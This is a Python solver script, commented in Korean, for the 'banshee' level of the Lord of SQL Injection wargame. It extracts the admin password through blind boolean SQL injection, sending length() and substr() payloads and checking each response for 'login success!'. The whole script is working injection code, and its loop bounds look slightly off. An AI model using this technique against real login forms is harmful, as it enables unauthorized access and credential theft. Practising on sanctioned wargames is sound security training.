import requests
from settings import session_id


# 기본 설정
url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php"
cookies = {'PHPSESSID': session_id}


# 비밀번호 자릿수 확인
# - 1부터 50까지 테스트
def find_pw_length():
    for n in range(1, 50 + 1):
        payload = f"?pw=' or id='admin' and length(pw)={n}--"
        res = requests.get(url + payload, cookies=cookies)

        # login success! 문자열이 반환되면 참
        if "login success!" in res.text:
            return n
    return


# 구한 비밀번호 길이 값을 가지고 비밀번호 값을 구하는 함수
def find_pw(length):
    pw = str()
    for i in range(0, length + 1):
        for j in range(48, 122):  # 아스키 범위로 탐색
            # substr 함수를 사용해 각 자리 별로 참에 해당하는 값을 구한다.
            payload = "?pw=' or id='admin' and substr(pw,{},1)='{}' --".format(i, chr(j))  # injection payload
            res = requests.get(url + payload, cookies=cookies)

            # login success! 문자열이 반환되면 참
            if "login success!" in res.text:
                print(chr(j))
                pw += chr(j)
                break
    return pw


pw_length = find_pw_length()
print(f"Password length: {pw_length}")
pw = find_pw(pw_length)
print(f"Password: {pw}")
